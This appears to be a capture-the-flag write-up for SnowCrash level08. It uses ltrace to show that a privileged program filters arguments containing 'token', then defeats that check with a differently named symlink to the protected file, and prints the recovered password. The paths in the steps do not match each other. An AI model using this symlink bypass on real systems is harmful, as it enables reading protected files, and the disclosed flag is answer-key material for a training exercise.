
### Observation

-> If we ltrace ./level08 we can see

strstr look for a sub string inside the file name, so let's rename it token to match and see if it's execute something else.

```bash
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                  = "token"
printf("You may not access '%s'\n", "/dev/shm/token"You may not access '/dev/shm/token'
) = 36
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

So let's make a symbolic link to print what it into token file and bypass the permissions.
Let's use the folder /dev/shm for that, we have all the rights in it.

```bash
level08@SnowCrash:~$ ln -s /home/user/level08/token /dev/shm/yo
level08@SnowCrash:~$ 
```

-> Permission deny

The symlink cannot bypass the right of the file.
For that we have to passs throught all folder that have the right `x` and the file must have the right `r`.

### Conclusion

-> The symlink is a pointer to another file path.

The level08 program will just check the file name of the symlink. NOT the name of the pointed file.

```bash
level08@SnowCrash:~$ ./level08 /var/crash/yop
quif5eloekouj29ke0vouxean
```
